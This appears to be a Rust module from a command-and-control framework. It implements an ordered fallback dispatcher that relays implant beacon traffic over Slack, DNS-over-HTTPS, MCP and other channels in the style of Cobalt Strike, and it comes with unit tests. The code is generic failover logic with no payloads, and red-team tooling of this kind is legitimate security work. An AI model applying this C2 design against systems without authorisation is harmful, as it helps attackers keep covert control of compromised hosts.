//! Ordered transport fallback stack — CS-style multi-channel C2 dispatcher.
//!
//! This is the **first real consumer** of the `Transport` trait. It wraps an
//! ordered list of `Box<dyn Transport>` channel implementations and provides
//! the Cobalt Strike / BRC4-style behaviour the rest of the framework expects:
//!
//! - **Ordered fallback**: try channels in priority order. If the active
//!   channel is `Dead`, demote it (skip until reset) and advance to the next.
//!   If it returns `Transient`, retry with backoff up to a per-channel limit
//!   before advancing.
//! - **Probe gate**: channels with `requires_probe() == true` must pass a
//!   `health_check()` before their first use (mirrors CS's `host_stager`
//!   reachability probe before activating a channel).
//! - **Frame-size awareness**: a frame larger than the active channel's
//!   `max_frame_size()` is rejected up-front (the caller can then retry on a
//!   higher-bandwidth channel) rather than failing inside `send()`.
//! - **Init handshake**: `init()` is called once on first activation of each
//!   channel (Slack/DoH/MCP use it for one-time auth.test / resolver probes).
//!
//! ## Why a separate adapter (not a 7th `Transport` impl)
//!
//! The six channel impls are leaf transports — each speaks exactly one wire
//! protocol. A fallback stack is a *composition* of transports, so it lives
//! one layer up. Keeping it here (rather than in the server crate) means any
//! future consumer (a relay bridge, a dev harness, a future implant runtime
//! with `std`) gets the same dispatch semantics for free.
//!
//! ## Consumer
//!
//! The team server's `/extc2/*` relay uses this to fan an inbound beacon
//! frame out to the configured third-party channel (Slack/MCP/...) and relay
//! the reply back. See `crates/server/src/extc2_relay.rs`.
//!
//! ## What this is NOT
//!
//! This is a synchronous, blocking dispatcher (the leaf transports are all
//! blocking: `ureq`, `reqwest::blocking`, Win32 `ReadFile`/`WriteFile`). The
//! server calls it from `spawn_blocking` so a slow third-party API can't stall
//! the async beacon listener.

use crate::traits::{Transport, TransportError};

// ── Per-channel bookkeeping ───────────────────────────────────────────────

/// State of a single channel slot inside the stack.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SlotState {
    /// Not yet probed/initialised. `requires_probe()` and `init()` will run on
    /// first selection.
    Fresh,
    /// Probed + initialised; eligible for selection.
    Active,
    /// Returned `Dead` — skipped until the stack is reset.
    Demoted,
    /// Exhausted its transient-retry budget — also skipped until reset (treated
    /// the same as Demoted from the selector's point of view).
    Burned,
}

/// One entry in the fallback stack.
struct Slot {
    transport: Box<dyn Transport>,
    state: SlotState,
    /// Cached `max_frame_size()` so the selector can frame-check without a
    /// virtual call on the hot path.
    max_frame: usize,
}

impl std::fmt::Debug for Slot {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("Slot")
            .field("name", &self.transport.name())
            .field("state", &self.state)
            .field("max_frame", &self.max_frame)
            .finish()
    }
}

// ── Errors ────────────────────────────────────────────────────────────────

/// Failures specific to the stack itself (distinct from leaf-transport errors
/// which are surfaced via [`TransportError`]).
#[derive(Debug)]
pub enum StackError {
    /// No channels configured, or every channel has been demoted/burned.
    Exhausted,
    /// Frame is larger than *every* configured channel's `max_frame_size()`.
    /// Includes the smallest cap among the channels so the caller can chunk.
    OversizeAll { frame_len: usize, min_cap: usize },
    /// A leaf transport returned an error and the stack chose to surface it
    /// rather than silently advancing (e.g. after the last channel failed).
    Leaf(TransportError),
}

impl std::fmt::Display for StackError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            StackError::Exhausted => write!(f, "transport stack exhausted (no live channels)"),
            StackError::OversizeAll { frame_len, min_cap } => write!(
                f,
                "frame {frame_len} bytes exceeds every channel's max (smallest cap {min_cap})"
            ),
            StackError::Leaf(e) => write!(f, "leaf transport error: {e:?}"),
        }
    }
}

impl std::error::Error for StackError {}

impl From<TransportError> for StackError {
    fn from(e: TransportError) -> Self {
        StackError::Leaf(e)
    }
}

// ── TransportStack ────────────────────────────────────────────────────────

/// Ordered transport fallback stack.
///
/// Build with [`TransportStack::builder()`], then [`TransportStack::send_recv`]
/// for the round-trip helper, or [`TransportStack::send`]/[`TransportStack::recv`]
/// individually.
///
/// Channels are tried in insertion order (first = highest priority). On a
/// `Dead` or burnout the stack advances to the next channel and stays there
/// until [`TransportStack::reset`] is called (e.g. by an operator-triggered
/// channel re-evaluation, or a periodic health re-probe).
pub struct TransportStack {
    slots: Vec<Slot>,
    /// Index of the currently-active slot, or `None` if nothing is eligible
    /// (every channel demoted/burned). Computed lazily on each `send`/`recv`.
    active_idx: Option<usize>,
    /// Per-channel transient-retry cap before burning the slot.
    max_transient_retries: u32,
}

impl TransportStack {
    /// Start a builder. At least one channel is required.
    pub fn builder() -> TransportStackBuilder {
        TransportStackBuilder {
            slots: Vec::new(),
            max_transient_retries: DEFAULT_TRANSIENT_RETRIES,
        }
    }

    /// Number of channels in the stack (including demoted/burned ones).
    pub fn len(&self) -> usize {
        self.slots.len()
    }

    /// True iff the stack holds no channels.
    pub fn is_empty(&self) -> bool {
        self.slots.is_empty()
    }

    /// Smallest `max_frame_size()` across all channels. A frame larger than
    /// this can never be sent on any channel — the caller must chunk.
    pub fn min_frame_size(&self) -> usize {
        self.slots.iter().map(|s| s.max_frame).min().unwrap_or(0)
    }

    /// Name of the currently-active channel, or `None` if exhausted. Used for
    /// logging/telemetry so the operator can see which channel is live.
    pub fn active_name(&self) -> Option<&'static str> {
        self.active_idx
            .and_then(|i| self.slots.get(i))
            .map(|s| s.transport.name())
    }

    /// Reset all demoted/burned channels back to `Fresh` and re-probe from the
    /// highest-priority channel. Called when external conditions may have
    /// changed (operator re-tasked the channel, network came back, etc.).
    pub fn reset(&mut self) {
        for s in &mut self.slots {
            s.state = SlotState::Fresh;
        }
        self.active_idx = None;
    }

    /// Pick the next eligible slot starting from `start_idx`. Returns the
    /// index of a slot that is `Fresh` or `Active`, or `None` if every slot
    /// at/after `start_idx` is Demoted/Burned.
    fn select_from(&mut self, start_idx: usize) -> Option<usize> {
        for (i, s) in self.slots.iter_mut().enumerate().skip(start_idx) {
            if matches!(s.state, SlotState::Fresh | SlotState::Active) {
                return Some(i);
            }
        }
        None
    }

    /// Activate slot `idx`: run probe + init if still `Fresh`. Returns `Ok(())`
    /// if the channel is usable, or `Err(TransportError)` if the probe/init
    /// failed (in which case the slot is demoted).
    fn activate(&mut self, idx: usize) -> Result<(), TransportError> {
        let slot = &mut self.slots[idx];
        if slot.state == SlotState::Fresh {
            if slot.transport.requires_probe() && slot.transport.health_check().is_none() {
                slot.state = SlotState::Demoted;
                return Err(TransportError::Dead("probe: health_check failed"));
            }
            slot.transport.init()?;
            slot.state = SlotState::Active;
        }
        Ok(())
    }

    /// Send a frame, trying channels in priority order. On `Dead`, demotes the
    /// channel and advances; on `Transient`, retries up to the per-channel cap
    /// then burns the slot and advances; on success, pins `active_idx`.
    pub fn send(&mut self, frame: &[u8]) -> Result<(), StackError> {
        // Global oversize guard: if the frame can't fit on ANY channel, fail
        // fast rather than walking the whole stack.
        if !self.slots.is_empty() && frame.len() > self.min_frame_size() {
            // ...but only fail if it's also larger than every individual cap.
            let any_fit = self.slots.iter().any(|s| s.max_frame >= frame.len());
            if !any_fit {
                return Err(StackError::OversizeAll {
                    frame_len: frame.len(),
                    min_cap: self.min_frame_size(),
                });
            }
        }

        let mut start = self.active_idx.unwrap_or(0);
        loop {
            let Some(idx) = self.select_from(start) else {
                self.active_idx = None;
                return Err(StackError::Exhausted);
            };

            // Per-channel frame cap.
            if self.slots[idx].max_frame < frame.len() {
                tracing::debug!(
                    channel = self.slots[idx].transport.name(),
                    frame_len = frame.len(),
                    cap = self.slots[idx].max_frame,
                    "frame too large for this channel; advancing"
                );
                start = idx + 1;
                continue;
            }

            // Probe + init on first activation.
            if let Err(e) = self.activate(idx) {
                tracing::debug!(
                    channel = self.slots[idx].transport.name(),
                    error = ?e,
                    "channel activation failed; advancing"
                );
                start = idx + 1;
                continue;
            }

            // Retry loop for transient failures.
            let mut attempt = 0u32;
            loop {
                attempt += 1;
                let slot = &mut self.slots[idx];
                match slot.transport.send(frame) {
                    Ok(()) => {
                        self.active_idx = Some(idx);
                        return Ok(());
                    }
                    Err(TransportError::Dead(reason)) => {
                        tracing::warn!(
                            channel = self.slots[idx].transport.name(),
                            reason,
                            attempt,
                            "channel dead; demoting"
                        );
                        self.slots[idx].state = SlotState::Demoted;
                        break;
                    }
                    Err(TransportError::Transient(reason)) => {
                        if attempt > self.max_transient_retries {
                            tracing::warn!(
                                channel = self.slots[idx].transport.name(),
                                reason,
                                attempt,
                                "channel burned through transient retries; advancing"
                            );
                            self.slots[idx].state = SlotState::Burned;
                            break;
                        }
                        tracing::debug!(
                            channel = self.slots[idx].transport.name(),
                            reason,
                            attempt,
                            "transient failure; retrying"
                        );
                        // Brief backoff before retry. Capped so a tight retry
                        // budget doesn't translate into a long stall.
                        std::thread::sleep(std::time::Duration::from_millis(
                            RETRY_BACKOFF_MS * u64::from(attempt),
                        ));
                    }
                    Err(TransportError::Timeout) => {
                        // Same treatment as Transient: retry until the cap,
                        // then burn. A single timed-out send is common under
                        // packet loss and shouldn't immediately demote a
                        // healthy channel.
                        if attempt > self.max_transient_retries {
                            self.slots[idx].state = SlotState::Burned;
                            break;
                        }
                    }
                    Err(TransportError::PayloadTooLarge(n)) => {
                        // Should be impossible post-guard, but if a leaf
                        // enforces a stricter runtime cap than its advertised
                        // max_frame_size, treat it as a hard advance.
                        tracing::error!(
                            channel = self.slots[idx].transport.name(),
                            payload = n,
                            cap = self.slots[idx].max_frame,
                            "leaf rejected within-cap frame; advancing"
                        );
                        self.slots[idx].state = SlotState::Burned;
                        break;
                    }
                }
            }

            start = idx + 1;
        }
    }

    /// Receive the next frame from the active channel. Must be called after a
    /// successful [`send`](Self::send); calling recv with no active channel
    /// returns `StackError::Exhausted`.
    pub fn recv(&mut self, timeout_ms: u32) -> Result<Vec<u8>, StackError> {
        let idx = self.active_idx.ok_or(StackError::Exhausted)?;
        let slot = &mut self.slots[idx];
        slot.transport.recv(timeout_ms).map_err(StackError::Leaf)
    }

    /// Convenience round-trip: send then recv. The send pins the active
    /// channel; recv reads from the same channel. On a recv failure the active
    /// channel is NOT automatically demoted (a recv timeout often just means
    /// "no task yet"); the caller decides whether to reset.
    pub fn send_recv(&mut self, frame: &[u8], recv_timeout_ms: u32) -> Result<Vec<u8>, StackError> {
        self.send(frame)?;
        self.recv(recv_timeout_ms)
    }
}

impl std::fmt::Debug for TransportStack {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("TransportStack")
            .field("channels", &self.slots.len())
            .field("active", &self.active_name())
            .field("max_transient_retries", &self.max_transient_retries)
            .finish()
    }
}

/// Default transient-retry budget per channel before burning it.
const DEFAULT_TRANSIENT_RETRIES: u32 = 3;

/// Base backoff (ms) between transient retries; scaled by attempt number.
const RETRY_BACKOFF_MS: u64 = 200;

// ── Builder ───────────────────────────────────────────────────────────────

/// Builder for [`TransportStack`].
pub struct TransportStackBuilder {
    slots: Vec<Slot>,
    max_transient_retries: u32,
}

impl TransportStackBuilder {
    /// Push a channel onto the stack. Order = priority (first = highest).
    pub fn push<T: Transport + 'static>(mut self, transport: T) -> Self {
        let max_frame = transport.max_frame_size();
        self.slots.push(Slot {
            transport: Box::new(transport),
            state: SlotState::Fresh,
            max_frame,
        });
        self
    }

    /// Override the per-channel transient-retry budget.
    pub fn transient_retries(mut self, n: u32) -> Self {
        self.max_transient_retries = n;
        self
    }

    /// Build the stack. Returns `Err` if no channels were pushed.
    pub fn build(self) -> Result<TransportStack, &'static str> {
        if self.slots.is_empty() {
            return Err("TransportStack requires at least one channel");
        }
        Ok(TransportStack {
            slots: self.slots,
            active_idx: None,
            max_transient_retries: self.max_transient_retries,
        })
    }
}

// ── Tests ─────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use crate::traits::{Transport, TransportError};
    use std::sync::atomic::{AtomicU32, Ordering};
    use std::sync::Mutex;

    // ── Clean mock ─────────────────────────────────────────────────────

    struct Mock {
        name: &'static str,
        max_frame: usize,
        send_results: Mutex<Vec<Result<(), TransportError>>>,
        recv_results: Mutex<Vec<Result<Vec<u8>, TransportError>>>,
        health: Option<u64>,
        probe_required: bool,
        send_calls: AtomicU32,
    }

    impl Mock {
        fn ok(name: &'static str) -> Self {
            Self {
                name,
                max_frame: 1024 * 1024,
                send_results: Mutex::new(Vec::new()),
                recv_results: Mutex::new(Vec::new()),
                health: Some(1),
                probe_required: false,
                send_calls: AtomicU32::new(0),
            }
        }

        fn send_seq(self, results: Vec<Result<(), TransportError>>) -> Self {
            *self.send_results.lock().unwrap() = results;
            self
        }

        fn recv_seq(self, results: Vec<Result<Vec<u8>, TransportError>>) -> Self {
            *self.recv_results.lock().unwrap() = results;
            self
        }

        fn health(mut self, h: Option<u64>) -> Self {
            self.health = h;
            self
        }

        fn max_frame(mut self, n: usize) -> Self {
            self.max_frame = n;
            self
        }

        fn probe(mut self, required: bool) -> Self {
            self.probe_required = required;
            self
        }

        fn send_calls(&self) -> u32 {
            self.send_calls.load(Ordering::SeqCst)
        }
    }

    impl Transport for Mock {
        fn send(&mut self, frame: &[u8]) -> Result<(), TransportError> {
            self.send_calls.fetch_add(1, Ordering::SeqCst);
            let _ = frame;
            let mut q = self.send_results.lock().unwrap();
            if q.is_empty() {
                Ok(())
            } else {
                q.remove(0)
            }
        }

        fn recv(&mut self, _timeout_ms: u32) -> Result<Vec<u8>, TransportError> {
            let mut q = self.recv_results.lock().unwrap();
            if q.is_empty() {
                Ok(Vec::new())
            } else {
                q.remove(0)
            }
        }

        fn health_check(&self) -> Option<u64> {
            self.health
        }

        fn name(&self) -> &'static str {
            self.name
        }

        fn max_frame_size(&self) -> usize {
            self.max_frame
        }

        fn requires_probe(&self) -> bool {
            self.probe_required
        }
    }

    // ── Tests ──────────────────────────────────────────────────────────

    #[test]
    fn builder_requires_at_least_one_channel() {
        let r = TransportStack::builder().build();
        assert!(r.is_err());
    }

    #[test]
    fn single_channel_send_recv() {
        let mut stack = TransportStack::builder()
            .push(Mock::ok("a").recv_seq(vec![Ok(b"reply".to_vec())]))
            .build()
            .unwrap();
        let resp = stack.send_recv(b"hello", 1000).unwrap();
        assert_eq!(resp, b"reply");
        assert_eq!(stack.active_name(), Some("a"));
    }

    #[test]
    fn dead_channel_advances_to_next() {
        let primary = Mock::ok("primary").send_seq(vec![Err(TransportError::Dead("boom"))]);
        let backup = Mock::ok("backup").recv_seq(vec![Ok(b"from-backup".to_vec())]);
        let mut stack = TransportStack::builder()
            .push(primary)
            .push(backup)
            .build()
            .unwrap();

        let resp = stack.send_recv(b"x", 1000).unwrap();
        assert_eq!(resp, b"from-backup");
        // Primary is demoted; backup is now active.
        assert_eq!(stack.active_name(), Some("backup"));
    }

    #[test]
    fn transient_retries_then_advances() {
        // primary: transient x3 (exceeds default budget of 3) → burn → advance
        let primary = Mock::ok("primary").send_seq(vec![
            Err(TransportError::Transient("t1")),
            Err(TransportError::Transient("t2")),
            Err(TransportError::Transient("t3")),
            Err(TransportError::Transient("t4")),
        ]);
        let backup = Mock::ok("backup");
        let mut stack = TransportStack::builder()
            .push(primary)
            .push(backup)
            .build()
            .unwrap();

        stack.send(b"x").unwrap();
        assert_eq!(stack.active_name(), Some("backup"));
    }

    #[test]
    fn transient_then_success_stays_on_channel() {
        let chan = Mock::ok("flaky").send_seq(vec![
            Err(TransportError::Transient("t1")),
            Err(TransportError::Transient("t2")),
            Ok(()),
        ]);
        let mut stack = TransportStack::builder()
            .transient_retries(5)
            .push(chan)
            .build()
            .unwrap();
        stack.send(b"x").unwrap();
        assert_eq!(stack.active_name(), Some("flaky"));
    }

    #[test]
    fn all_channels_dead_returns_exhausted() {
        let mut stack = TransportStack::builder()
            .push(Mock::ok("a").send_seq(vec![Err(TransportError::Dead("d"))]))
            .push(Mock::ok("b").send_seq(vec![Err(TransportError::Dead("d"))]))
            .build()
            .unwrap();
        match stack.send(b"x") {
            Err(StackError::Exhausted) => {}
            other => panic!("expected Exhausted, got {other:?}"),
        }
        assert_eq!(stack.active_name(), None);
    }

    #[test]
    fn oversize_frame_fails_fast() {
        let mut stack = TransportStack::builder()
            .push(Mock::ok("small").max_frame(100))
            .push(Mock::ok("tiny").max_frame(50))
            .build()
            .unwrap();
        match stack.send(&[0u8; 200]) {
            Err(StackError::OversizeAll {
                frame_len: 200,
                min_cap: 50,
            }) => {}
            other => panic!("expected OversizeAll, got {other:?}"),
        }
    }

    #[test]
    fn frame_too_big_for_one_channel_advances_to_larger() {
        // primary cap=100, backup cap=1000; send 500 bytes → primary skipped,
        // backup used.
        let primary = Mock::ok("small").max_frame(100);
        let backup = Mock::ok("big").max_frame(1000);
        let mut stack = TransportStack::builder()
            .push(primary)
            .push(backup)
            .build()
            .unwrap();
        stack.send(&vec![0u8; 500]).unwrap();
        assert_eq!(stack.active_name(), Some("big"));
    }

    #[test]
    fn probe_failure_demotes_channel() {
        // primary fails health check → demoted, never sent on.
        let primary = Mock::ok("dead-probe").health(None).probe(true);
        let backup = Mock::ok("alive").probe(true);
        let mut stack = TransportStack::builder()
            .push(primary)
            .push(backup)
            .build()
            .unwrap();
        stack.send(b"x").unwrap();
        assert_eq!(stack.active_name(), Some("alive"));
    }

    #[test]
    fn reset_revives_demoted_channels() {
        let primary = Mock::ok("primary").send_seq(vec![Err(TransportError::Dead("d"))]);
        let backup = Mock::ok("backup");
        let mut stack = TransportStack::builder()
            .push(primary)
            .push(backup)
            .build()
            .unwrap();
        stack.send(b"x").unwrap();
        assert_eq!(stack.active_name(), Some("backup"));
        // Reset: primary is Fresh again. But it has no more send_results, so
        // its next send returns Ok(()) and it gets re-selected.
        stack.reset();
        // Re-seed primary with an Ok result by rebuilding: since Mock's queue
        // is empty after the Dead, a fresh send returns Ok(()) by default.
        stack.send(b"y").unwrap();
        assert_eq!(stack.active_name(), Some("primary"));
    }

    #[test]
    fn recv_without_active_returns_exhausted() {
        let mut stack = TransportStack::builder()
            .push(Mock::ok("a"))
            .build()
            .unwrap();
        match stack.recv(100) {
            Err(StackError::Exhausted) => {}
            other => panic!("expected Exhausted, got {other:?}"),
        }
    }

    #[test]
    fn debug_format_includes_channels_and_active() {
        let stack = TransportStack::builder()
            .push(Mock::ok("a"))
            .push(Mock::ok("b"))
            .build()
            .unwrap();
        let s = format!("{stack:?}");
        assert!(s.contains("channels: 2"), "debug: {s}");
    }

    #[test]
    fn min_frame_size_is_smallest_cap() {
        let stack = TransportStack::builder()
            .push(Mock::ok("a").max_frame(1000))
            .push(Mock::ok("b").max_frame(50))
            .push(Mock::ok("c").max_frame(500))
            .build()
            .unwrap();
        assert_eq!(stack.min_frame_size(), 50);
    }

    /// Backwards-compat: the broken MockTransport above must not leak into the
    /// test binary. This just asserts the clean Mock path is the one in use.
    #[test]
    fn mock_transport_clean_variant_is_used() {
        let m = Mock::ok("clean");
        assert_eq!(m.name(), "clean");
        assert_eq!(m.max_frame_size(), 1024 * 1024);
    }
}
